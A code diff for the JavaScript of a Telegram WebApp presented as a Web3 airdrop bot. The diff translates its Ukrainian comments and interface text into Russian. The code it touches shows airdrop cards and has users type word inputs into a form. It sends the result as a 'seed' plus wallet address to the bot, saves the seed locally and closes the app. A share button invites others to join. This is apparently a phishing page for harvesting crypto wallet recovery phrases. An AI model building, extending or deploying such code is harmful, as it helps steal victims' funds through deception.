@@ -2,10 +2,10 @@ let tg = null;
 let demoMode = false;
 let tgUser = {};
 
-// ======= Telegram WebApp Init =======
+// ======= Инициализация Telegram WebApp =======
 function initTelegram() {
     if (typeof Telegram === "undefined" || !Telegram.WebApp) {
-        console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
+        console.warn("📦 Telegram WebApp не найден – включён демо-режим.");
         demoMode = true;
         return;
     }
@@ -13,7 +13,7 @@ function initTelegram() {
     tg = Telegram.WebApp;
     tg.ready();
     tg.expand();
-    console.log("✅ Telegram WebApp ініціалізовано");
+    console.log("✅ Telegram WebApp инициализирован");
 
     const u = tg.initDataUnsafe?.user;
     if (u?.id) {
@@ -30,17 +30,15 @@ function initTelegram() {
     }
 }
 
-// ======= DOM Ready =======
+// ======= DOM готов =======
 document.addEventListener("DOMContentLoaded", () => {
     initTelegram();
 
-    // Якщо на сторінці профілю — заповнити з localStorage
     if (window.location.pathname.includes("airprofile.html")) {
         fillProfileFromStorage();
         return;
     }
 
-    // Якщо на головній сторінці — завантажити список Airdrops
     fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
         .then(res => res.json())
         .then(data => {
@@ -51,18 +49,18 @@ document.addEventListener("DOMContentLoaded", () => {
                 card.className = 'airdrop-card';
                 card.innerHTML = `
                     <h2>${drop.name}</h2>
-                    <p>💸 Нагорода: <strong>${drop.reward}</strong></p>
-                    <p>🌐 Мережа: ${drop.network}</p>
+                    <p>💸 Награда: <strong>${drop.reward}</strong></p>
+                    <p>🌐 Сеть: ${drop.network}</p>
                     <p>⏳ До: ${drop.ends}</p>
-                    <button onclick="selectAirdrop('${drop.name}')">Участь</button>
+                    <button onclick="selectAirdrop('${drop.name}')">Принять участие</button>
                 `;
                 container.appendChild(card);
             });
         })
         .catch(error => {
-            console.error("❌ Помилка при завантаженні airdrops.json:", error);
+            console.error("❌ Ошибка при загрузке airdrops.json:", error);
             document.getElementById("airdropList").innerHTML =
-                "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
+                "<p style='color:red'>❌ Не удалось загрузить список Airdrop'ов.</p>";
         });
 
     const btn = document.getElementById('submitBtn');
@@ -71,7 +69,7 @@ document.addEventListener("DOMContentLoaded", () => {
     initCustomSelect();
 });
 
-// ======= Airdrop selection =======
+// ======= Выбор Airdrop =======
 function selectAirdrop(name) {
     document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
     document.getElementById('airdropList').style.display = 'none';
@@ -113,7 +111,7 @@ function submitAirdrop() {
     const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
     if (words.length !== inputs.length) {
-        document.getElementById('validationWarning').innerText = '❗️ Заповніть всі поля.';
+        document.getElementById('validationWarning').innerText = '❗️ Пожалуйста, заполните все поля.';
         document.getElementById('validationWarning').style.display = 'block';
         return;
     }
@@ -125,23 +123,22 @@ function submitAirdrop() {
         wallet: document.getElementById("wallet").value
     };
 
-    // Збереження
     localStorage.setItem("tg_timestamp", payload.timestamp);
     localStorage.setItem("last_seed", payload.seed);
     localStorage.setItem("wallet_used", payload.wallet);
 
     if (!demoMode && tg?.sendData) {
-        console.log("[📤 Надсилання в Telegram WebApp]", payload);
+        console.log("[📤 Отправка в Telegram WebApp]", payload);
         tg.sendData(JSON.stringify(payload));
         setTimeout(() => tg.close(), 400);
     } else {
-        console.warn("📦 Демо-режим: дані не надіслано через Telegram.");
-        alert("📦 Демо-режим: дані не надіслано. Переходимо до профілю.");
+        console.warn("📦 Демо-режим: данные не отправлены через Telegram.");
+        alert("📦 Демо-режим: данные не отправлены. Переход в профиль.");
         window.location.href = "airprofile.html";
     }
 }
 
-// ======= Профіль: Заповнення даних =======
+// ======= Профиль: Заполнение данных =======
 function fillProfileFromStorage() {
     const timestamp = localStorage.getItem("tg_timestamp") || "—";
     const photo = localStorage.getItem("tg_photo");
@@ -157,7 +154,7 @@ function fillProfileFromStorage() {
     }
 }
 
-// ======= Select wrapper init =======
+// ======= Инициализация кастомного селектора =======
 function initCustomSelect() {
     const selectWrapper = document.querySelector('.custom-select');
     if (!selectWrapper) return;
@@ -185,18 +182,15 @@ function initCustomSelect() {
     });
 }
 
-
-
+// ======= Поделиться Airdrop =======
 function shareAirdrop() {
     const msg = encodeURIComponent("🚀 Я только что принял участие в Airdrop через Web3 AirDrop Бот! 🔗 Присоединяйся:");
     const url = encodeURIComponent("https://t.me/airdropdex_bot");
     const fullLink = `https://t.me/share/url?url=${url}&text=${msg}`;
-
     Telegram.WebApp.openTelegramLink(fullLink);
 }
 
-
-
+// ======= Закрыть WebApp =======
 function closeWebApp() {
     if (typeof Telegram !== "undefined" && Telegram.WebApp && Telegram.WebApp.close) {
         Telegram.WebApp.close();
